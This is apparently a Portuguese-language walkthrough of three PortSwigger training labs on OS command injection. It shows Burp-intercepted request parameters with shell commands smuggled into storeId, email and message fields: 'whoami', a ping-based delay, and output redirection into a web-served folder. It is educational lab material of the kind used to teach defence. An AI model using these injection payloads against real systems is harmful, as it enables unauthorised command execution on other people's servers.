---
title: "PortSwigger - OS Command Injection"
author: "imendes"
date: 2026-01-18
subject: "PortSwigger Labs Walkthrough"
description: "Write-up técnico dos laboratórios de OS Command Injection da PortSwigger"
keywords: ["PortSwigger", "OS Command Injection", "Command Injection", "Web Security", "RCE"]
lang: pt-BR
titlepage: true
titlepage-color: "483D8B"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
categories: [PortSwigger]
---

## Lab: OS command injection, simple case

“This lab contains an OS command injection vulnerability in the product stock checker.

The application executes a shell command containing 
user-supplied product and store IDs, and returns the raw output from the
 command in its response.

To solve the lab, execute the `whoami` command to determine the name of the current user.”

A descrição do Lab indica que devemos procurar pela vulnerabilidade na funcionalidade “product stock checker”, que verifica quantos itens existem em um determinado estoque selecionado. 

Interceptando a requisição pelo Burp, temos os seguintes parâmetros de requisição: 

```
productId=2&storeId=1 
```

Considerando que a aplicação executa um comando shell utilizando os parâmetros de requisição, podemos modificar os parâmetros e verificar os resultados:

```
productId=2&storeId=1;whoami
```

Desta maneira, temos a seguinte resposta: 

```
32 peter-NtwcVg
OS command injection
```

## Lab: Blind OS command injection with time delays

“This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.”

O comando que será utilizado para gerar o dealy de 10s será:

```bash
& ping -c 10 127.0.0.1 
```

Interceptando a requisição pelo Burp Suite, observamos os seguintes parâmetros de requisição:

```bash
csrf=8WkIpFGbTDQJeSObDU17MtkkJrWIvPi2&
name=a&
email=a%40email.com&
subject=a&
message=a
```

O delay de 10s foi observado quando o comando é injetado no parâmetro de email:

```bash
csrf=8WkIpFGbTDQJeSObDU17MtkkJrWIvPi2&
name=a&
email=a%40email.com+%26+ping+-c+10+127.0.0.1++%26&
subject=a&
message=a
```

## Lab: Blind OS command injection with output redirection**

“This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the 
user-supplied details. The output from the command is not returned in 
the response. However, you can use output redirection to capture the 
output from the command. There is a writable folder at:

```
/var/www/images/
```

The application serves the images for the product catalog 
from this location. You can redirect the output from the injected 
command to a file in this folder, and then use the image loading URL to 
retrieve the contents of the file.

To solve the lab, execute the `whoami` command and retrieve the output.”

Para redirecionar o output do comando utilizaremos:

```bash
& whoami > /var/www/images/whoami.txt &
```

Injetando esse comando no parâmetro de mensagem temos:

```bash
csrf=lIpf6scVhUrMZmM2BXDqCaK48Y1rKTfL&
name=a&
email=a%40gmail.com&
subject=a&
message=a+%26+whoami+>+/var/www/images/whoami.txt+%26
```

Recebemos uma resposta 200 e verificamos na url de acesso às imagens que o arquivo realmente foi gravado com o resultado do comando `whoami`. 

url [`https://host/image?filename=whoami.txt`](https://0a0b0041033ef7d380cc3ad1008100e5.web-security-academy.net/image?filename=whoami.txt).
